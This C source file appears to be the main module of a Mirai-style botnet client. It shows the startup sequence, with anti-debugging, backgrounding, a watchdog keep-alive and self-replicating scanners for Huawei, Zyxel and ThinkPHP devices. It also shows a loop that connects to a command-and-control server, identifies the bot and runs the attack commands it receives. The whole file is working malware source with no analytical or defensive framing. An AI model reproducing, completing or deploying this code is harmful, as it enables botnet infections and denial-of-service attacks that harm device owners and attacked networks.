#include "includes.h"
#include "attack.h"
#include "resolv.h"
#include "table.h"
#include "rand.h"
#include "util.h"

#ifdef KILLER
#include "killer.h"
#endif

#ifdef SELFREP
#include "scanner.h"
#include "huawei.h"
#include "zyxel.h"
#include "thinkphp.h"
#endif

#ifdef WATCHDOG
/* Watchdog maintenance is done inline */
static void watchdog_maintain(void) {
    if (fork() == 0) {
        while (TRUE) {
            int fd = open("/dev/watchdog", 2);
            if (fd != -1) {
                while (TRUE) {
                    write(fd, "", 1);
                    sleep(10);
                }
            }
            sleep(60);
        }
    }
}
#endif

static ipv4_t local_addr;
static ipv4_t cnc_addr;
static int fd_ctrl = -1;
static int fd_serv = -1;

/* Function prototypes */
static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static BOOL ensure_single_instance(void);

int main(int argc, char **args) {
    /* Anti-debugging */
    signal(SIGTRAP, anti_gdb_entry);

    /* Single instance check */
    if (!ensure_single_instance()) {
        return 1;
    }

    /* Get local IP */
    local_addr = util_local_addr();

    /* Initialize string table */
    table_init();

    /* Initialize random number generator */
    rand_init();

    /* Fork to background */
    if (fork() > 0) {
        return 0;
    }

    /* Close standard file descriptors */
    close(STDIN);
    close(STDOUT);
    close(STDERR);

    /* Initialize attack system */
    attack_init();

    /* Start killer if enabled */
#ifdef KILLER
    killer_init();
#endif

    /* Start scanners if enabled */
#ifdef SELFREP
    scanner_init();
    huawei_scanner_init();
    zyxel_scanner_init();
    thinkphp_scanner_init();
#endif

    /* Start watchdog if enabled */
#ifdef WATCHDOG
    watchdog_maintain();
#endif

    /* Main connection loop */
    while (TRUE) {
        resolve_cnc_addr();
        establish_connection();

        /* Main select loop */
        while (TRUE) {
            fd_set fdset;
            struct timeval tv;

            FD_ZERO(&fdset);
            FD_SET(fd_serv, &fdset);

            tv.tv_sec = 1;
            tv.tv_usec = 0;

            if (select(fd_serv + 1, &fdset, NULL, NULL, &tv) > 0) {
                uint8_t buf[4096];
                int n;

                n = read(fd_serv, buf, sizeof(buf));
                if (n <= 0) {
                    teardown_connection();
                    break;
                }

                /* Process command from C&C */
                if (buf[0] == 0x00) {
                    /* Attack command */
                    attack_parse((char *)buf, n);
                } else {
                    /* Echo back for keepalive */
                    write(fd_serv, buf, n);
                }
            }
        }

        sleep(5);
    }

    return 0;
}

static void anti_gdb_entry(int sig) {
    signal(SIGTRAP, anti_gdb_entry);
}

static void resolve_cnc_addr(void) {
    struct resolv_entries *entries;

    /* Try to resolve domain if configured */
    entries = resolv_lookup(CNC_ADDR);
    if (entries == NULL) {
        cnc_addr = inet_addr(CNC_ADDR);
        return;
    }

    cnc_addr = entries->addrs[rand_next() % entries->count];
    resolv_entries_free(entries);
}

static void establish_connection(void) {
    struct sockaddr_in addr;
    int port;
    char port_str[8];
    int port_len;

    table_unlock_val(TABLE_CNC_PORT);
    port_len = util_strlen(table_retrieve_val(TABLE_CNC_PORT, &port_len));
    strncpy(port_str, table_retrieve_val(TABLE_CNC_PORT, &port_len), sizeof(port_str));
    port = util_atoi(port_str);
    table_lock_val(TABLE_CNC_PORT);

    fd_serv = socket(AF_INET, SOCK_STREAM, 0);
    if (fd_serv == -1) {
        sleep(5);
        return;
    }

    /* Set non-blocking */
    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = cnc_addr;
    addr.sin_port = htons(port);

    /* Connect with timeout */
    if (connect(fd_serv, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
        if (errno != EINPROGRESS) {
            close(fd_serv);
            sleep(5);
            return;
        }
    }

    /* Wait for connection */
    sleep(1);

    /* Send bot identification */
    uint8_t id_buf[5];
    id_buf[0] = 0x00;
    id_buf[1] = 0x00;
    id_buf[2] = 0x00;
    id_buf[3] = 0x01; // Bot version
    id_buf[4] = 0x00; // Source length (none)

    write(fd_serv, id_buf, 5);
}

static void teardown_connection(void) {
    if (fd_serv != -1) {
        close(fd_serv);
        fd_serv = -1;
    }

    /* Kill all ongoing attacks */
    attack_kill_all();
}

static BOOL ensure_single_instance(void) {
    fd_ctrl = socket(AF_INET, SOCK_STREAM, 0);
    if (fd_ctrl == -1) return FALSE;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_LOOPBACK;
    addr.sin_port = htons(SINGLE_INSTANCE_PORT);

    if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
        close(fd_ctrl);
        return FALSE;
    }

    close(fd_ctrl);
    return TRUE;
}
